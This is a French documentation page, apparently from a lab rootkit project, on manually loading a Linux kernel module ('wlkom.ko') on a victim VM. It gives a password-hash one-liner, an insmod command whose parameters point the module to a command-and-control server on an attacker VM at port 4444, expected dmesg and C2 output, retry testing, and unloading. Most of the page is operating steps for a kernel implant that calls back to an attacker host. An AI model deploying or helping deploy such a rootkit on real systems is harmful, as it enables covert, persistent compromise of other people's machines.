# Charger le module manuellement

Le chargement manuel avec `insmod` est utile pour tester rapidement une nouvelle version du `.ko` sans configurer la persistance. C'est le mode à utiliser pendant le développement.

!!! note "Prérequis"
    Le module doit être compilé sur la VM Victime. Voir [Compiler le module](compile.md).

---

## Calculer le hash du mot de passe

`wlkom.ko` ne stocke pas de mot de passe en clair. Il attend un hash FNV-1a 32-bit du mot de passe, passé comme paramètre au chargement.

Pour calculer le hash du mot de passe `test` :

```bash
python3 -c "
h = 2166136261
for c in 'test':
    h = ((h ^ ord(c)) * 16777619) & 0xFFFFFFFF
print(f'{h:08x}')
"
```

Résultat : `afd071e5`

Pour un autre mot de passe, remplacez `'test'` par votre mot de passe.

---

## Charger le module

Le C2 doit écouter **avant** de charger le module. Le module tente de se connecter dès le chargement — si le C2 n'est pas là, il retry toutes les 5 secondes, mais il est plus propre de lancer le C2 d'abord.

```bash
# Sur la VM Victime (SSH)
cd /mnt/vmshare/rootkit
sudo insmod wlkom.ko password_hash=afd071e5 c2_ip=192.168.100.10 c2_port=4444
```

Remplacez `afd071e5` par le hash de votre mot de passe, et `192.168.100.10` par l'IP de votre VM Attaquante si elle diffère.

---

## Vérifier le chargement

```bash
sudo dmesg | tail -5
```

Sortie attendue après chargement réussi et connexion établie :

```
wlkom: loaded
wlkom: connected to C2 192.168.100.10:4444
wlkom: C2 authenticated
```

Vérifier que le module est bien chargé :

```bash
lsmod | grep wlkom
```

---

## Décharger le module

```bash
sudo rmmod wlkom
```

```bash
sudo dmesg | tail -3
```

Sortie attendue :

```
wlkom: unloaded
```

Sur le terminal C2 (VM Attaquante), vous verrez :

```
[-] Rootkit disconnected
[?] Waiting for rootkit connection...
```

---

## Paramètres disponibles

| Paramètre | Valeur par défaut | Description |
|---|---|---|
| `password_hash` | *(obligatoire)* | Hash FNV-1a 32-bit du mot de passe (ex: `afd071e5` pour `test`) |
| `c2_ip` | `192.168.100.10` | IP de la VM Attaquante |
| `c2_port` | `4444` | Port TCP du C2 |

Si `password_hash` est absent ou vide, le module refuse de se charger avec une erreur `-EINVAL` :

```
insmod: ERROR: could not insert module wlkom.ko: Invalid argument
dmesg: wlkom: password_hash parameter is required
```

---

## Voir les logs en temps réel

Pour suivre les logs du module en direct pendant les tests :

```bash
sudo dmesg -w
```

`Ctrl+C` pour arrêter le suivi.

---

## Tester le retry

Pour vérifier que le module retente la connexion automatiquement si le C2 est indisponible :

1. Chargez le module **sans** que le C2 soit lancé
2. Observez dans `dmesg -w` :

```
wlkom: loaded
wlkom: C2 unreachable (-111), retry in 5s
wlkom: C2 unreachable (-111), retry in 5s
...
```

3. Lancez le C2 sur la VM Attaquante
4. Observez la connexion automatique dans `dmesg` :

```
wlkom: connected to C2 192.168.100.10:4444
wlkom: C2 authenticated
```

---

## Vérification

- [x] `sudo insmod wlkom.ko password_hash=afd071e5 ...` ne retourne pas d'erreur
- [x] `dmesg` affiche `wlkom: loaded` puis `wlkom: C2 authenticated`
- [x] `lsmod | grep wlkom` affiche le module
- [x] `sudo rmmod wlkom` décharge proprement
